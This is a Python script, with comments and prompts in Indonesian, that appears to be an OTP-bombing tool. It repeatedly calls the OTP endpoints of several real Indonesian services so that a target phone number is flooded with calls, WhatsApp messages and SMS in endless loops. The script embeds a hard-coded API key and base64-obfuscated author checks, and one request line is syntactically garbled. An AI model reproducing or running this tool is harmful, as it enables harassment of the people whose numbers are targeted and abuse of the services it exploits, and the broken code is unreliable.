# --- [ INFORMASI PEMBUAT ] --- #
try: os.system("git pull")
except: pass
if sys.platform.lower() == "win": os.system("cls")
else: os.system("clear")

# --- [ UNTUK DELAY ] --- #
def waktu(min, sc):
    total_second = min * 60 + sc
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'\r[*] delay 00:{mins:02d}:{secs:02d} detik', end='')
        time.sleep(1)
        total_second -= 1

# --- [ UNTUM SPAM CALL ] --- #
def spam_call(nomor):
	global no
	try:
		date = {"number": nomor,"country_code":"+62","type":"CITCALL"}
		ses.headers.update({"x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj", "Key": "Um9jaG1hdCBCYXN1a2k="})
		if author not in base64.b64decode(ses.headers["Key"].encode("ascii")).decode("ascii"): exit(base64.b64decode("WyFdIEFPS1dPV0tXT0sgUkVLT0RFICEhISE=".encode("ascii")).decode("ascii"))
		post = ses.post("https://beta.api.saturdays.com/api/v1/user/otp/send": "https://srv3.sampingan.co.id/auth/generate-otp", data=date).json()
		if "True" in str(post): no += 1; print(f"[{no}] sukses spam call")
		else: print("[*] terkena limit call")
		ses.cookies.clear(); ses.close()
	except Exception as e: pass

# --- [ UNTUK SPAM WA ] --- #	
def spam_wa(nomor):
	global no
	try:
		date = {"accountType":"customers","countryCode":"62","medium":"whatsapp","otpType":"register","phoneNumber": nomor}
		ses.headers.update({ "Key": "Um9jaG1hdCBCYXN1a2k="})
		if author not in base64.b64decode(ses.headers["Key"].encode("ascii")).decode("ascii"): exit(base64.b64decode("WyFdIEFPS1dPV0tXT0sgUkVLT0RFICEhISE=".encode("ascii")).decode("ascii"))
		post = ses.post("https://www.pinhome.id/api/pinaccount/request/otp", data=date).text
		if "Code" in str(post): no += 1; print(f"[{no}] sukses spam wa")
		else: print("\r[*] terkena limit wa")
		ses.cookies.clear(); ses.close()
	except Exception as e: pass

# --- [ UNTUK SPAM SMS ] --- #
def spam_sms(nomor):
	global no
	try:
		# Spam Sms 1 By Ipot Id
		date = {"action": "send_user_otp", "resendc": "2", "user_phone": "62"+nomor}
		post = ses.post("https://infokost.id/wp-admin/admin-ajax.php", data=date).text
		if "ok" in post: no += 1; print(f"\r[{no}] sukses spam sms      ")
		ses.cookies.clear(); ses.close()
	except Exception as e: pass
	
def menu_utama():
	print("             - BOT BRUTAL SPAM WA DAN CALL - \n                     [ RozhBasXYZ ]")
	afakah = input("[1] spam call\n[2] spam wa\n[3] spam sms\n[4] spam brutal\n[*] pilih : "); print('-'*15)
	nomor = input("[*] nomor : 0"); print('-'*15)
	if afakah in ["1"]:
		print("[!] spam call max 5X sehari per device"); print('-'*15)
		while True: spam_call(nomor); waktu(00, 60)
	elif afakah in ["2"]:
		print("[!] spam wa unlimited delay auto 30 detik"); print('-'*15)
		while True: spam_wa(nomor) ;waktu(00, 30)
	elif afakah in ["3"]:
		print("[!] spam sms unlimited tanpa batas"); print('-'*15)
		while True: spam_sms(nomor); waktu(00, 5)
	elif afakah in ["4"]:
		print("[!] 1 wa, 1 call dan 30 sms tanpa delay per 30 detik"); print('-'*15)
		while True:
			spam_call(nomor); spam_wa(nomor)
			for x in range(15): spam_sms(nomor)
	else: exit("[*] apa woyy")
	
if __name__ == "__main__":
	menu_utama()
